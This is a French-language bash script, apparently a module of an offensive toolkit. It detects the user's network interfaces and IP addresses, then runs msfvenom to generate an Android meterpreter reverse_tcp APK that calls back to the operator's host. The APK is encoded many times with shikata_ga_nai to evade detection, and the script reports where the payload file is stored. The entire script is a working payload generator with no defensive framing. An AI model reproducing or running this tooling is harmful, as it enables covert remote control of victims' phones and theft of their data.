## Couleurs BASH
DEFAULT="\e[00m"
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
ORANGE="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
WHITE="\e[37m"

## Effets de texte (défaut, gras, souligné)
export DEF="\e[0;0m"
export BOLD="\e[1m"
export UNDER="\e[4m"

eth0=`ifconfig | grep -v -i "ether" | awk {'print $1'} | sed "s/.$//" | grep "eth" | tail -1` > /dev/null 2>&1
wlan0=`ifconfig | awk {'print $1'} | sed "s/.$//" | grep "wlan" | tail -1` > /dev/null 2>&1
if [ -z "$wlan0" ];then
	if [ -z "$eth0" ];then
		interface="  lo "
	else
		interface=$eth0
	fi
else
	interface=$wlan0
fi
ipprivee=`ifconfig $interface | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
ippublique=`wget http://checkip.dyndns.org -O - -o /dev/null | cut -d : -f 2 | cut -d \< -f 1` > /dev/null 2>&1
gateway=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1
session=`hostname`
iprange=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1
path=`pwd`

trap ctrl_c INT
ctrl_c() {
echo "" && echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s
cd
cd $path/../../
./suite.sh
}

echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez le nom à donner au payload (NOM.apk) : $DEFAULT"
read nom

echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez le port à utiliser (réutiliser ce port lors de l'ouverture du listener) (4444) : $DEFAULT"
read port

echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez le nombre d'itérations à effectuer pour encoder le payload (100) : $DEFAULT"
read iterations

if [ $nom = "$1" ]
then
	nom="payload.apk"
fi
if [ $port = "$1" ]
then
	port=4444
fi
if [ $iterations = "$1" ]
then
	iterations=100
fi

echo -e "
$BLUE [...]$DEFAULT$CYAN Création du payload... $DEFAULT
"

cd
msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=$ipprivee LPORT=$port -i $iterations R > $path/../../output/$nom | grep "x86/shikata_ga_nai"

echo -e "$BLUE [...]$DEFAULT$CYAN Stockage du payload... $DEFAULT
"

cd $path/../../output/
chemin=`pwd`
cd $path

sleep 0.5

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Le payload a bien été créé. $DEFAULT
"
sleep 0.2

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Le payload se trouve ici : $chemin/. $DEFAULT
"
sleep 0.8



echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s




cd
cd $path/../../
./suite.sh
